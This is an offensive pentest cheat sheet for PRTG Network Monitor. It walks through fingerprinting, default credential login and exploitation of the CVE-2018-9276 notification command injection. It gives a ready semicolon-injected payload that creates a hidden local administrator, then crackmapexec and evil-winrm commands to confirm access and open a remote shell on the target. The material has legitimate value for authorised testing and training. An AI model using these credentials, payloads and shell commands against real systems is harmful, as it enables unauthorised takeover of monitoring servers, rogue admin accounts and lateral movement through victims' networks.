# PRTG Network Monitor Assessment
**Concept:** PRTG Network Monitor is a Windows-based agentless network monitoring software. It typically runs on port **8080** or **443**. 
**Attack Surface:** Default Credentials and Authenticated Remote Code Execution (Command Injection).
## 1. Discovery & Fingerprinting
**Goal:** Identify PRTG instances and check versions.
### Indicators
- **Port:** TCP 8080 (HTTP) or 443 (HTTPS).
- **Footer:** "PRTG Network Monitor" usually appears in the login page footer.
- **Version:** Often displayed in the page source or footer (e.g., `Version 18.2.39`).
### Enumeration
```shell
# Check version via curl
curl -s http://target.local:8080/index.htm | grep "version"
```
## 2. Authentication (Default Credentials)
**Goal:** Gain administrative access to the dashboard.
PRTG comes with default credentials that are frequently left unchanged during internal deployments.
- **User:** `prtgadmin` 
- **Password:** `prtgadmin`

**Other Common Variants:**
- `prtgadmin : Password123`
- `admin : admin`
## 3. Exploitation: Notification Command Injection (CVE-2018-9276)
**Concept:** PRTG allows admins to create "Notifications" that execute scripts when an alert triggers. In vulnerable versions (< 18.2.39), the **Parameter** field passed to the PowerShell script is not sanitized, allowing command injection via the `;` separator. 
**Impact:** Remote Code Execution (RCE) as `SYSTEM` or `Local Service`.
### Execution Steps
1. **Navigate:** Go to **Setup** -> **Account Settings** -> **Notifications**.
2. **Create:** Click **Add new notification**.
3. **Configure:**
    - **Name:** `PwnNotification`
    - **Execute Program:** Check this box.
    - **Program File:** Select `Demo exe notification - outfile.ps1`.
    - **Parameter:** Inject your payload here using the semicolon separator.
    
    **Payload (Add Local Admin):**
```shell
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
4. **Save:** Click **Save**.
5. **Trigger:** Locate your new notification in the list and click the **Test** button.
    - _Result:_ You will see a message: "EXE notification is queued up".
### Verification (Lateral Movement)
Once the user is added, verify access using `CrackMapExec` or `evil-winrm`.
```shell
# Verify Local Admin Access
crackmapexec smb <TARGET_IP> -u prtgadm1 -p 'Pwn3d_by_PRTG!'

# Get Shell
evil-winrm -i <TARGET_IP> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```